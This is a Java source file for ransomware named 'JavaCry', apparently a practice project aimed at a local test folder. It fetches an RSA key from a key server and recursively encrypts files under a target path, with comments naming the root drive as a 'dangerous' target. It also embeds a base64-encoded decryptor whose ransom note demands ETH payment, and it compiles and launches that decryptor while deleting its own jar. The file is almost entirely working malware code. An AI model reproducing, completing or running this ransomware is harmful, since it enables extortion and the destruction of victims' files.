import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.*;
import java.security.MessageDigest;
import java.security.spec.X509EncodedKeySpec;
import java.util.*;
import java.util.stream.Collectors;
import java.util.stream.Stream;




public class JavaCry {
    /*
   Dangerous target paths:
   Mac & Linux:
   private static String targetPath = "/";

   Windows:
   private static String targetPath = "C:\";
 */
    private static String addr="127.0.0.1";
    private static String targetPath="/Users/daniel/Desktop/java_practice/JavaCry/Test_Env";
    private static String os=System.getProperty("os.name").split(" ")[0];
    private static List<Path>files=new ArrayList<Path>();
    private static Random rand=new Random(System.currentTimeMillis());
    private static int id=(int)(rand.nextInt(Integer.MAX_VALUE));
    private static RSACrypt crypto;
    private static String decryptorPayload="aW1wb3J0IGphdmEuYXd0Lio7CmltcG9ydCBqYXZheC5zd2luZy4qOwppbXBvcnQgamF2YS5hd3QuZXZlbnQuKjsKaW1wb3J0IGphdmEuYXd0LkNvbG9yOwoKaW1wb3J0IGphdmEudXRpbC4qOwppbXBvcnQgamF2YS5uZXQuKjsKaW1wb3J0IGphdmEuaW8uKjsKaW1wb3J0IGphdmEuaW8uRmlsZU91dHB1dFN0cmVhbTsKaW1wb3J0IGphdmEudXRpbC5zdHJlYW0uQ29sbGVjdG9yczsKaW1wb3J0IGphdmEubmlvLmZpbGUuRmlsZXM7CmltcG9ydCBqYXZhLm5pby5maWxlLlBhdGg7CmltcG9ydCBqYXZhLm5pby5maWxlLlBhdGhzOwppbXBvcnQgamF2YS5pby5GaWxlSW5wdXRTdHJlYW07CmltcG9ydCBqYXZhLmlvLkZpbGVPdXRwdXRTdHJlYW07CmltcG9ydCBqYXZhLnNlY3VyaXR5LlNlY3VyZVJhbmRvbTsKaW1wb3J0IGphdmF4LmNyeXB0by5DaXBoZXI7CmltcG9ydCBqYXZheC5jcnlwdG8uS2V5R2VuZXJhdG9yOwppbXBvcnQgamF2YXguY3J5cHRvLlNlY3JldEtleTsKaW1wb3J0IGphdmF4LmNyeXB0by5zcGVjLlNlY3JldEtleVNwZWM7CmltcG9ydCBqYXZheC5jcnlwdG8uc3BlYy5JdlBhcmFtZXRlclNwZWM7CmltcG9ydCBqYXZhLnV0aWwuQmFzZTY0OwppbXBvcnQgamF2YS5uaW8uZmlsZS5QYXRoOwppbXBvcnQgamF2YS5uaW8uZmlsZS5QYXRoczsKaW1wb3J0IGphdmEudXRpbC5zdHJlYW0uU3RyZWFtOwoKaW1wb3J0IGphdmEuc2VjdXJpdHkuKjsKaW1wb3J0IGphdmEuc2VjdXJpdHkuSW52YWxpZEtleUV4Y2VwdGlvbjsKaW1wb3J0IGphdmF4LmNyeXB0by5CYWRQYWRkaW5nRXhjZXB0aW9uOwppbXBvcnQgamF2YXguY3J5cHRvLklsbGVnYWxCbG9ja1NpemVFeGNlcHRpb247CmltcG9ydCBqYXZhLnNlY3VyaXR5LnNwZWMuUEtDUzhFbmNvZGVkS2V5U3BlYzsKCgovKgogICBkZWNyeXB0b3I6CiAgIEJUQyBwYXltZW50IGludGVyZmFjZQogICBSZXF1ZXN0IGZvciBkZWNyeXB0aW9uIGZ1bmN0aW9uYWxpdHkKICAgaWYgcmVjZWl2ZXMgdGhlIGtleSwgdXNlIHRoZSBrZXkgdG8gZGVjcnlwdCB0aGUgZmlsZXMKICAgZGVzdHJveSBkZWNyeXB0b3IuamF2YQogKi8KCmNsYXNzIERlY3J5cHRvciB7CnByaXZhdGUgc3RhdGljIGludCBpZCA9IDgwMjEzMTUwMzsKcHJpdmF0ZSBTb2NrZXQgc29ja2V0Owpwcml2YXRlIHN0YXRpYyBTdHJpbmcgYWRkcmVzcyA9ICIxMjcuMC4wLjEiOwpwcml2YXRlIGludCBwb3J0Owpwcml2YXRlIERhdGFPdXRwdXRTdHJlYW0gb3V0ICAgICA9IG51bGw7CnByaXZhdGUgRGF0YUlucHV0U3RyZWFtIGluICAgICA9IG51bGw7CnByaXZhdGUgU3RyaW5nIGI2NHByaXZrZXk7CnByaXZhdGUgUHJpdmF0ZUtleSBwcml2YXRlX2tleTsKcHJpdmF0ZSBzdGF0aWMgamF2YS51dGlsLkxpc3Q8UGF0aD4gZmlsZXMgPSBuZXcgQXJyYXlMaXN0PFBhdGg+KCk7CnByaXZhdGUgc3RhdGljIFN0cmluZyB0YXJnZXRQYXRoID0gIi9Vc2Vycy9kYW5pZWwvRGVza3RvcC9qYXZhX3ByYWN0aWNlL0phdmFDcnkvVGVzdF9FbnYiOwpwcml2YXRlIENpcGhlciBSU0FfQ2lwaGVyOwpwcml2YXRlIENpcGhlciBBRVNfQ2lwaGVyOwoKcHVibGljIERlY3J5cHRvcigpIHsKICAgICAgICBwb3J0ID0gNTU1NTsKCiAgICAgICAgU3RyaW5nIG5vdGUgPSBTdHJpbmcuam9pbigiXG4iCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICI8aHRtbD4iCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICIiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICI8aDEgc3R5bGUgPSAnZm9udC1zaXplOiAzMnB4Oyc+WW91ciBmaWxlcyBoYXZlIGJlZW4gZW5jcnlwdGVkLjwvaDE+IgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLCAiPHA+IgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLCAiWW91ciBmaWxlcyBoYXZlIGJlZW4gZW5jcnlwdGVkLiBJZiB5b3Ugd2FudCB0byBkZWNyeXB0IHlvdXIgZmlsZXMsIHBsZWFzZSBjb3B5IHRoZSBjb250ZW50IG9mIHNlbmR0b21lLnR4dCBzZW5kIGl0IHdpdGggJDEgRVRIIHRvIFtNeSBBZGRyZXNzXS4gWW91IGNhbiBmb2xsb3cgdGhpcyB0dXRvcmlhbCB0byBzZW5kIG1lIG1vbmV5OiA8YWRkcmVzcz5odHRwczovL3d3dy55b3V0dWJlLmNvbS93YXRjaD92PUV3eFBxYnNlRnJFPC9hZGRyZXNzPi4gSSB3aWxsIGNoZWNrIHRoZSBwYXltZW50cyBiZWZvcmUgSSBhcHByb3ZlIHlvdXIgcmVxdWVzdCBmb3IgZGVjcnlwdGlvbi4iCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICI8L3A+IgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLCAiPHA+IgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLCAiPGJyPjxiPkRvbuKAmXQgZGVsZXRlIG9yIG1vZGlmeSBhbnkgY29udGVudCBpbiBLZXlfcHJvdGVjdGVkLmtleSwgb3IgeW91IHdpbGwgbG9zZSB5b3VyIGFiaWxpdHkgdG8gZGVjcnlwdCB5b3VyIGZpbGVzLjwvYj4iCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsICI8L3A+IgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLCAiPHA+IgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLCAiPGJyPklmIHlvdSB3YW50IHRvIG9wZW4gdGhpcyB3aW5kb3cgYWdhaW4sIHBsZWFzZSBydW4gRGVjcnlwdG9yLmphci48YnI+IgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLCAiPC9wPiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICwgIjwvaHRtbD4iCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICApOwogICAgICAgIEpGcmFtZSBmID0gbmV3IEpGcmFtZSgpOwogICAgICAgIEpQYW5lbCBwYW5lbCA9IG5ldyBKUGFuZWwobmV3IEZsb3dMYXlvdXQoKSk7CiAgICAgICAgSkxhYmVsIGh0bWwgPSBuZXcgSkxhYmVsKG5vdGUsIEpMYWJlbC5MRUZUKTsKCiAgICAgICAgSkJ1dHRvbiBiID0gbmV3IEpCdXR0b24oIlJlcXVlc3QgZm9yIERlY3J5cHRpb24iKTsKCiAgICAgICAgSkxhYmVsIHN0YXR1cyA9IG5ldyBKTGFiZWwoIiIpOwogICAgICAgIGIuYWRkQWN0aW9uTGlzdGVuZXIobmV3IEFjdGlvbkxpc3RlbmVyKCkgewoKICAgICAgICAgICAgICAgICAgICAgICAgQE92ZXJyaWRlCiAgICAgICAgICAgICAgICAgICAgICAgIHB1YmxpYyB2b2lkIGFjdGlvblBlcmZvcm1lZChBY3Rpb25FdmVudCBlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGF0dXMuc2V0VGV4dCgiVHJ5aW5nIHRvIGNvbm5lY3QiKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc29ja2V0ID0gbmV3IFNvY2tldChhZGRyZXNzLCBwb3J0KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdHVzLnNldFRleHQoIldhaXRpbmcgZm9yIGFwcHJvdmFsIik7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBzZW5kcyBvdXRwdXQgdG8gdGhlIHNvY2tldAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbiA9IG5ldyBEYXRhSW5wdXRTdHJlYW0oc29ja2V0LmdldElucHV0U3RyZWFtKCkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvdXQgPSBuZXcgRGF0YU91dHB1dFN0cmVhbShzb2NrZXQuZ2V0T3V0cHV0U3RyZWFtKCkpOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3V0LndyaXRlVVRGKFN0cmluZy52YWx1ZU9mKGlkKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGI2NHByaXZrZXkgPSBpbi5yZWFkVVRGKCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFN5c3RlbS5vdXQucHJpbnRsbihiNjRwcml2a2V5KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGI2NHByaXZrZXkuZXF1YWxzKCJidXQgSSByZWZ1c2UiKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXR1cy5zZXRUZXh0KCJZb3VyIHJlcXVlc3QgaGFzIGJlZW4gcmVqZWN0ZWQiKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnl0ZVtdIHB1YiA9IEJhc2U2NC5nZXREZWNvZGVyKCkuZGVjb2RlKGI2NHByaXZrZXkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQS0NTOEVuY29kZWRLZXlTcGVjIHNwZWMgPSBuZXcgUEtDUzhFbmNvZGVkS2V5U3BlYyhwdWIpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBLZXlGYWN0b3J5IGZhY3RvcnkgPSBLZXlGYWN0b3J5LmdldEluc3RhbmNlKCJSU0EiKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpdmF0ZV9rZXkgPSBmYWN0b3J5LmdlbmVyYXRlUHJpdmF0ZShzcGVjKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdHVzLnNldFRleHQoIllvdSBhcmUgYXBwcm92ZWQsIGRlY3J5cHRpbmcgZmlsZXMiKTsKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFJTQV9DaXBoZXIgPSBDaXBoZXIuZ2V0SW5zdGFuY2UoIlJTQSIpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBBRVNfQ2lwaGVyID0gQ2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IChTdHJlYW08UGF0aD4gcGF0aHMgPSBGaWxlcy53YWxrKFBhdGhzLmdldCh0YXJnZXRQYXRoKSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlcyA9IHBhdGhzLmZpbHRlcihGaWxlczo6aXNSZWd1bGFyRmlsZSkuY29sbGVjdChDb2xsZWN0b3JzLnRvTGlzdCgpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGVycikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRlY3J5cHRGaWxlcygpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXR1cy5zZXRUZXh0KCJZb3UncmUgZmlsZXMgaGF2ZSBiZWVuIGRlY3J5cHRlZCBzdWNjZXNzZnVsbHkiKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGVycikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXR1cy5zZXRUZXh0KCJEZWNyeXB0aW9uIGZhaWxlZCIpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgoKCgoKICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgY2F0Y2goVW5rbm93bkhvc3RFeGNlcHRpb24gdSkKICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFN5c3RlbS5vdXQucHJpbnRsbih1KTsKICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgY2F0Y2goSU9FeGNlcHRpb24gaSkKICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFN5c3RlbS5vdXQucHJpbnRsbihpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhdHVzLnNldFRleHQoIkNvbm5lY3Rpb24gZmFpbGVkIik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGVycikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgU3lzdGVtLm91dC5wcmludGxuKGVycik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9KTsKCgogICAgICAgIGIuc2V0Qm91bmRzKDMwLCAyMDAsIDIwMCwgNTApOwogICAgICAgIHN0YXR1cy5zZXRCb3VuZHMoMTAwLCAzMDAsIDQwMCwgMzApOwogICAgICAgIHBhbmVsLnNldExheW91dChuZXcgRmxvd0xheW91dCgpKTsKCiAgICAgICAgZi5zZXRCYWNrZ3JvdW5kKENvbG9yLlJFRCk7CiAgICAgICAgZi5hZGQoYik7CiAgICAgICAgZi5hZGQoc3RhdHVzKTsKCiAgICAgICAgcGFuZWwuYWRkKGh0bWwpOwogICAgICAgIGYuZ2V0Q29udGVudFBhbmUoKS5hZGQocGFuZWwpOwoKICAgICAgICBmLnNldFNpemUoMTIwMCw2MDApOwoKICAgICAgICBmLnNldFRpdGxlKCJKYXZhQ3J5IERlY3J5cHRvciIpOwogICAgICAgIGYuc2V0RGVmYXVsdENsb3NlT3BlcmF0aW9uKEpGcmFtZS5FWElUX09OX0NMT1NFKTsKCiAgICAgICAgZi5zZXRWaXNpYmxlKHRydWUpOwp9CgpwdWJsaWMgYnl0ZVtdIFJTQUNyeXB0KEZpbGUgZikgewogIHRyeSB7CiAgICBGaWxlSW5wdXRTdHJlYW0gaW4gPSBuZXcgRmlsZUlucHV0U3RyZWFtKGYpOwogICAgYnl0ZVtdIGlucHV0ID0gbmV3IGJ5dGVbKGludCkgZi5sZW5ndGgoKV07CiAgICBpbi5yZWFkKGlucHV0KTsKCiAgICBGaWxlT3V0cHV0U3RyZWFtIG91dCA9IG5ldyBGaWxlT3V0cHV0U3RyZWFtKGYpOwogICAgYnl0ZVtdIG91dHB1dCA9IFJTQV9DaXBoZXIuZG9GaW5hbChpbnB1dCk7CgogICAgcmV0dXJuIG91dHB1dDsKICB9IGNhdGNoIChFeGNlcHRpb24gZSkgewogICAgU3lzdGVtLm91dC5wcmludGxuKGUpOwogIH0KICByZXR1cm4gbnVsbDsKfQoKcHVibGljIHZvaWQgQUVTQ3J5cHQoRmlsZSBmKSB7CiAgdHJ5IHsKICAgIEZpbGVJbnB1dFN0cmVhbSBpbiA9IG5ldyBGaWxlSW5wdXRTdHJlYW0oZik7CiAgICBieXRlW10gaW5wdXQgPSBuZXcgYnl0ZVsoaW50KSBmLmxlbmd0aCgpXTsKICAgIGluLnJlYWQoaW5wdXQpOwoKICAgIEZpbGVPdXRwdXRTdHJlYW0gb3V0ID0gbmV3IEZpbGVPdXRwdXRTdHJlYW0oZik7CiAgICBieXRlW10gb3V0cHV0ID0gQUVTX0NpcGhlci5kb0ZpbmFsKGlucHV0KTsKICAgIG91dC53cml0ZShvdXRwdXQpOwoKICAgIG91dC5mbHVzaCgpOwogICAgb3V0LmNsb3NlKCk7CiAgICBpbi5jbG9zZSgpOwogICAgU3lzdGVtLm91dC5wcmludGxuKCJEZWNyeXB0aW5nIGZpbGU6ICIgKyBmKTsKICB9IGNhdGNoIChFeGNlcHRpb24gZSkgewogICAgU3lzdGVtLm91dC5wcmludGxuKGUpOwogIH0KfQoKcHVibGljIHZvaWQgZGVjcnlwdEZpbGVzKCkgdGhyb3dzIEV4Y2VwdGlvbiB7CgogIFJTQV9DaXBoZXIuaW5pdChDaXBoZXIuREVDUllQVF9NT0RFLCBwcml2YXRlX2tleSk7CiAgRmlsZSBrID0gbmV3IEZpbGUoIktleV9wcm90ZWN0ZWQua2V5Iik7CiAgYnl0ZVtdIGRhdGEgPSBSU0FDcnlwdChrKTsKICBTZWNyZXRLZXkgQUVTS2V5ID0gbmV3IFNlY3JldEtleVNwZWMoZGF0YSwgMCwgZGF0YS5sZW5ndGgsICJBRVMiKTsKICBBRVNfQ2lwaGVyLmluaXQoQ2lwaGVyLkRFQ1JZUFRfTU9ERSwgQUVTS2V5KTsKICBmb3IgKFBhdGggcCA6IGZpbGVzKSB7CiAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICBGaWxlIGYgPSBwLnRvRmlsZSgpOwogICAgICAgICAgICAgICAgICBBRVNDcnlwdChmKTsKICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgICAgICAgIFN5c3RlbS5vdXQucHJpbnRsbihlKTsKICAgICAgICAgIH0KICB9Cgp9CgovLyBtYWluIG1ldGhvZApwdWJsaWMgc3RhdGljIHZvaWQgbWFpbihTdHJpbmcgYXJnc1tdKSB7CgovLyBjcmVhdGluZyBpbnN0YW5jZSBvZiBGcmFtZSBjbGFzcwogICAgICAgIERlY3J5cHRvciBhd3Rfb2JqID0gbmV3IERlY3J5cHRvcigpOwp9Cgp9Cg==";
    private static Process process;
    private static List<String>avoidDir=new ArrayList<String>();

    // decrypt files from a list of paths
    public static void decryptFiles(String keyString) {
        crypto.setPubKey(keyString);

        for (Path p : files) {
            try {
                File f=p.toFile();
                crypto.decrypt(f);
            }

            catch (Exception e) {
                System.out.println(e);
            }
        }
    }

    // encrypt files from a list of paths
    public static void encryptFiles() {
        for (Path p : files) {
            try {
                File f=p.toFile();
                crypto.encrypt(f);
            }

            catch (Exception e) {
                System.out.println(e);
            }
        }
    }

    public static String replaceLine(String src, int lineno, String content) {
        String out="";
        String[] lines=src.split("\n");

        for (int i=0; i < lines.length; i++) {
            if (i+1==lineno) {
                out+=content+"\n";
            }

            else {
                out+=lines[i]+"\n";
            }
        }

        return out;
    }

    public static void main(String[] args) {
        System.out.println("You're on "+ os); // Windows Mac Linux SunOS FreeBSD
        String h="";

        KeyClient key_client=new KeyClient(addr, 6666);

        if (key_client.getSuccess()) {

            try {
                // send id hash to server
                MessageDigest md=MessageDigest.getInstance("SHA-256");
                byte[] hash=md.digest(String.valueOf(id).getBytes(StandardCharsets.UTF_8));
                String b64hash=Base64.getEncoder().encodeToString(hash);
                h=b64hash;
                key_client.sendString(b64hash);

                // received allocated public key
                String b64pubkey=key_client.recvString();
                byte[] pub=Base64.getDecoder().decode(b64pubkey);
                X509EncodedKeySpec spec=new X509EncodedKeySpec(pub);
                KeyFactory factory=KeyFactory.getInstance("RSA");
                PublicKey public_key=factory.generatePublic(spec);

                crypto=new RSACrypt(public_key);

                key_client.close();
            }

            catch (Exception e) {
                System.out.println(1+""+e);
                return;
            }

            avoidDir.add("windows");
            avoidDir.add("library");
            avoidDir.add("boot");
            avoidDir.add("local");
            avoidDir.add("program files");
            avoidDir.add("programdata");
            avoidDir.add("System");
            avoidDir.add("Volumes");
            avoidDir.add("dev");
            avoidDir.add("etc");
            avoidDir.add("bin");
            avoidDir.add("$");

            // encrypt files recursively within the target directory
            try (Stream<Path> paths=Files.walk(Paths.get(targetPath))) {
                files=paths.filter(Files::isRegularFile).collect(Collectors.toList());
            }

            catch (Exception e) {
                ;
            }

            for (int i=0; i < files.size(); i++) {
                System.out.println(files.get(i));

                if (avoidDir.contains(files.get(i).toString())) {
                    files.remove(i);
                    i--;
                }
            }


            // This will encrypt files recursively in the target directory
            encryptFiles();
            crypto.SaveAESKey();


            try {
                File f=new File("Decryptor.java");

                if ( !f.exists()) {
                    f.createNewFile();
                }

                File s=new File("sendtome.txt");

                if ( !s.exists()) {
                    s.createNewFile();
                }

                File m=new File("manifest.txt");

                if ( !m.exists()) {
                    m.createNewFile();
                }

                // create Decryptor.jar
                String code=new String(Base64.getDecoder().decode(decryptorPayload));
                code=replaceLine(code, 43, "private static int id = "+ String.valueOf(id) + ";");
                FileWriter writer=new FileWriter("Decryptor.java");
                PrintStream manifest=new PrintStream(new File("manifest.txt"));
                manifest.println("Main-Class: Decryptor");
                writer.write(code);
                writer.close();

                // create sendtome.txt
                writer=new FileWriter("sendtome.txt");
                writer.write(h);
                writer.close();

                // run Decryptor.java
                process=Runtime.getRuntime().exec(String.format("javac Decryptor.java", System.getProperty("user.home")));
                BufferedReader b=new BufferedReader(new InputStreamReader(process.getInputStream()));

                String str;

                while ((str=b.readLine()) !=null) {
                    System.out.println(str);
                }

                b.close();

                process=Runtime.getRuntime().exec(String.format("jar -cvmf manifest.txt Decryptor.jar Decryptor.class Decryptor$1.class ", System.getProperty("user.home")));
                b=new BufferedReader(new InputStreamReader(process.getInputStream()));

                while ((str=b.readLine()) !=null) {
                    System.out.println(str);
                }

                b.close();

                if (f.delete()) {
                    System.out.println("Deleted the file: "+ f.getName());
                }

                else {
                    System.out.println("Failed to delete the file.");
                }

                if (m.delete()) {
                    System.out.println("Deleted the file: "+ m.getName());
                }

                else {
                    System.out.println("Failed to delete the file.");
                }

                File classFile=new File("Decryptor.class");

                if (classFile.delete()) {
                    System.out.println("Deleted the file: "+ classFile.getName());
                }

                else {
                    System.out.println("Failed to delete the file.");
                }

                File helperFile=new File("Decryptor$1.class");

                if (helperFile.delete()) {
                    System.out.println("Deleted the file: "+ helperFile.getName());
                }

                else {
                    System.out.println("Failed to delete the file.");
                }

                File self=new File("JavaCry.jar");

                if (self.exists()) {
                    self.delete();
                }


                process=Runtime.getRuntime().exec(String.format("java -jar Decryptor.jar", System.getProperty("user.home")));

            }

            catch (Exception e) {
                System.out.println(2+""+e);
            }

        }
    }
}
